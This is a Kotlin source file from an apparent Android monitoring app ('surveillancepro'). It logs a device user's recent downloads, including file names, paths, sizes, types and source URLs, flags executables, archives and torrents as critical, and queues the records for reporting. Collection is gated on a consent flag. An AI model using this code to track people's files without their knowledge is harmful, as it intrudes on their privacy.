package com.surveillancepro.android.services

import android.app.DownloadManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.database.Cursor
import android.net.Uri
import android.os.Environment
import android.util.Log
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Suivi des fichiers téléchargés.
 * 
 * DONNÉES CAPTURÉES:
 * - Nom du fichier
 * - URL source
 * - Taille du fichier
 * - Type MIME
 * - Date de téléchargement
 * - App qui a initié le téléchargement
 * 
 * MÉTHODES:
 * 1. BroadcastReceiver pour DownloadManager
 * 2. Scan périodique du dossier Downloads
 * 
 * SANS ROOT
 */
object DownloadTracker {
    
    private const val TAG = "DownloadTracker"
    
    private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
    
    // Fichiers déjà signalés (pour éviter les doublons)
    private val reportedFiles = mutableSetOf<String>()
    
    // Types de fichiers sensibles
    private val SENSITIVE_EXTENSIONS = listOf(
        // Documents
        ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
        ".txt", ".rtf", ".odt", ".ods",
        // Archives
        ".zip", ".rar", ".7z", ".tar", ".gz",
        // Images
        ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp",
        // Vidéos
        ".mp4", ".avi", ".mkv", ".mov", ".wmv", ".flv",
        // Audio
        ".mp3", ".wav", ".aac", ".flac", ".ogg",
        // Apps
        ".apk", ".exe", ".dmg",
        // Autres
        ".torrent", ".iso",
    )
    
    // Types de fichiers très sensibles (alerte immédiate)
    private val CRITICAL_EXTENSIONS = listOf(
        ".apk", ".exe", ".torrent", ".zip", ".rar"
    )
    
    /**
     * Scanne le dossier Downloads pour les nouveaux fichiers.
     */
    fun scanDownloads(context: Context) {
        val storage = DeviceStorage.getInstance(context)
        if (!storage.hasAccepted) return
        
        val queue = EventQueue.getInstance(context)
        val downloads = mutableListOf<Map<String, Any?>>()
        
        // Dossiers à scanner
        val downloadDirs = listOf(
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
            File(Environment.getExternalStorageDirectory(), "Download"),
            context.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS),
        )
        
        for (dir in downloadDirs) {
            if (dir == null || !dir.exists()) continue
            
            val files = dir.listFiles() ?: continue
            
            for (file in files) {
                if (!file.isFile) continue
                
                val filePath = file.absolutePath
                if (reportedFiles.contains(filePath)) continue
                
                // Vérifier si c'est un fichier récent (dernières 24h)
                val isRecent = System.currentTimeMillis() - file.lastModified() < 24 * 60 * 60 * 1000
                if (!isRecent) continue
                
                val extension = file.extension.lowercase()
                val isSensitive = SENSITIVE_EXTENSIONS.any { it.endsWith(extension) }
                val isCritical = CRITICAL_EXTENSIONS.any { it.endsWith(extension) }
                
                downloads.add(mapOf(
                    "filename" to file.name,
                    "path" to filePath,
                    "sizeBytes" to file.length(),
                    "extension" to extension,
                    "mimeType" to getMimeType(extension),
                    "downloadedAt" to dateFormat.format(Date(file.lastModified())),
                    "isSensitive" to isSensitive,
                    "isCritical" to isCritical,
                ))
                
                reportedFiles.add(filePath)
                
                Log.d(TAG, "New download detected: ${file.name} (${file.length()} bytes)")
            }
        }
        
        if (downloads.isNotEmpty()) {
            queue.enqueue("downloads_detected", mapOf(
                "downloads" to downloads,
                "count" to downloads.size,
                "hasCritical" to downloads.any { it["isCritical"] == true },
                "timestamp" to dateFormat.format(Date()),
            ))
        }
    }
    
    /**
     * Capture les téléchargements via DownloadManager.
     */
    fun captureFromDownloadManager(context: Context) {
        val storage = DeviceStorage.getInstance(context)
        if (!storage.hasAccepted) return
        
        val queue = EventQueue.getInstance(context)
        val dm = context.getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager
        
        val query = DownloadManager.Query()
        query.setFilterByStatus(DownloadManager.STATUS_SUCCESSFUL)
        
        val cursor: Cursor? = dm.query(query)
        
        cursor?.use {
            val idIndex = it.getColumnIndex(DownloadManager.COLUMN_ID)
            val titleIndex = it.getColumnIndex(DownloadManager.COLUMN_TITLE)
            val uriIndex = it.getColumnIndex(DownloadManager.COLUMN_URI)
            val localUriIndex = it.getColumnIndex(DownloadManager.COLUMN_LOCAL_URI)
            val sizeIndex = it.getColumnIndex(DownloadManager.COLUMN_TOTAL_SIZE_BYTES)
            val mimeIndex = it.getColumnIndex(DownloadManager.COLUMN_MEDIA_TYPE)
            val lastModIndex = it.getColumnIndex(DownloadManager.COLUMN_LAST_MODIFIED_TIMESTAMP)
            
            while (it.moveToNext()) {
                try {
                    val id = it.getLong(idIndex)
                    val idStr = "dm_$id"
                    
                    if (reportedFiles.contains(idStr)) continue
                    
                    val title = if (titleIndex >= 0) it.getString(titleIndex) else null
                    val uri = if (uriIndex >= 0) it.getString(uriIndex) else null
                    val localUri = if (localUriIndex >= 0) it.getString(localUriIndex) else null
                    val size = if (sizeIndex >= 0) it.getLong(sizeIndex) else 0
                    val mime = if (mimeIndex >= 0) it.getString(mimeIndex) else null
                    val lastMod = if (lastModIndex >= 0) it.getLong(lastModIndex) else 0
                    
                    // Vérifier si c'est récent
                    if (lastMod > 0 && System.currentTimeMillis() - lastMod > 24 * 60 * 60 * 1000) {
                        continue
                    }
                    
                    val filename = title ?: Uri.parse(localUri ?: "").lastPathSegment ?: "unknown"
                    val extension = filename.substringAfterLast(".", "")
                    val isCritical = CRITICAL_EXTENSIONS.any { it.endsWith(extension) }
                    
                    queue.enqueue("download_completed", mapOf<String, Any>(
                        "downloadId" to id,
                        "filename" to filename,
                        "sourceUrl" to (uri ?: ""),
                        "localPath" to (localUri ?: ""),
                        "sizeBytes" to size,
                        "mimeType" to (mime ?: ""),
                        "extension" to extension,
                        "isCritical" to isCritical,
                        "downloadedAt" to (if (lastMod > 0) dateFormat.format(Date(lastMod)) else ""),
                        "timestamp" to dateFormat.format(Date()),
                    ))
                    
                    reportedFiles.add(idStr)
                    
                    Log.d(TAG, "Download from manager: $filename")
                    
                } catch (e: Exception) {
                    Log.w(TAG, "Error reading download: ${e.message}")
                }
            }
        }
    }
    
    /**
     * Retourne le type MIME basé sur l'extension.
     */
    private fun getMimeType(extension: String): String {
        return when (extension.lowercase()) {
            "pdf" -> "application/pdf"
            "doc", "docx" -> "application/msword"
            "xls", "xlsx" -> "application/vnd.ms-excel"
            "ppt", "pptx" -> "application/vnd.ms-powerpoint"
            "txt" -> "text/plain"
            "jpg", "jpeg" -> "image/jpeg"
            "png" -> "image/png"
            "gif" -> "image/gif"
            "mp4" -> "video/mp4"
            "mp3" -> "audio/mpeg"
            "zip" -> "application/zip"
            "rar" -> "application/x-rar-compressed"
            "apk" -> "application/vnd.android.package-archive"
            else -> "application/octet-stream"
        }
    }
    
    /**
     * Nettoie le cache des fichiers signalés.
     */
    fun clearCache() {
        reportedFiles.clear()
    }
}

/**
 * BroadcastReceiver pour les téléchargements terminés.
 */
class DownloadCompleteReceiver : BroadcastReceiver() {
    
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == DownloadManager.ACTION_DOWNLOAD_COMPLETE) {
            val downloadId = intent.getLongExtra(DownloadManager.EXTRA_DOWNLOAD_ID, -1)
            if (downloadId != -1L) {
                Log.d("DownloadReceiver", "Download complete: $downloadId")
                DownloadTracker.captureFromDownloadManager(context)
            }
        }
    }
}
